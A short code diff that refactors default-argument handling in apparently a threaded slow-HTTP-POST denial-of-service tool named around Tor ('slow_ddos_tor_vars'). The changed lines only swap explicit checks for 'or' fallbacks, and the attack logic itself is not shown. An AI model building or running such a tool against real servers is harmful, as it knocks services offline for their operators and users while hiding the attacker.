@@ -53,7 +53,7 @@ import string
 import sys
 
 class httpPost(Thread):
-    def __init__(self, host, port, uri, sleepTime) :
+    def __init__(self, host="", port="", uri="", sleepTime="") :
         self.host = host
         self.port = port
         self.sleepTime = sleepTime
@@ -126,17 +126,14 @@ class httpPost(Thread):
                     pass    
 
 
-def kickOff(host="", port=-1, uri="", plist=[]) :
+def kickOff(host="", port="", uri="", plist=[]) :
     setHhdr = False
     threads = slow_ddos_tor_vars.getThreads()
     sleepTime = slow_ddos_tor_vars.getSleepTime()
     
-    if len(host) == 0:
-        host = slow_ddos_tor_vars.getHost()
-    if port == -1:
-        port = slow_ddos_tor_vars.getPort()
-    if len(uri) == 0:
-        uri = slow_ddos_tor_vars.getUri()
+    host = host or slow_ddos_tor_vars.getHost()
+    port = port or slow_ddos_tor_vars.getPort()
+    uri = uri or slow_ddos_tor_vars.getUri()
         
     hhdr = slow_ddos_tor_vars.getHostHeader()
     if hhdr:
